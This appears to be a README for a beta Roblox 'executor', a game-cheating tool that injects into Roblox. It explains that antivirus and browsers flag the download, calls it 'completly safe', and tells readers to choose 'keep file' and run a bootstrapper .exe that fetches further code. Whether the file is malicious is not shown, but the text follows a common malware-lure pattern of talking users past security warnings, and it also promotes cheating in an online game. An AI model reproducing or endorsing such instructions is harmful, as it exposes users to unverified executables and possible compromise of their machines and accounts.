# Simplistic.exe (Beta)

**Read if you have any issues**:
Now, all executors are flagged. Now why is this? Executors inject into the roblox game hacking its interfaces and letting you do anything you want to, tools used for ingame exploits and diffrent types of things are gonna get flagged by windows security and google. The download is completly safe and we are trying to remove the flag since we just need beta testers for now. The executor is going to be paid or require a key system because we need some sort of income, you guys are lucky and can get the free beta version for now. Your accses will be removed once we launch and we will make the program paid.

**How to download?**
Head over to the github and click the green button that says "Code", then click download zip. After the download might get flagged but thats okay, click keep file and download the boostrapper, then you want to extract the file (like with all files) after it is extracted run the "SimplisticDownloaderBeta.exe" file, this will download the executor into your downloads, now why do we do this? It is way easier than making a folder and putting all the code inside with weird stuff next to it. So by making a boostrapper we can ensure that there is no bugs and it is way easier to update our executor this way.
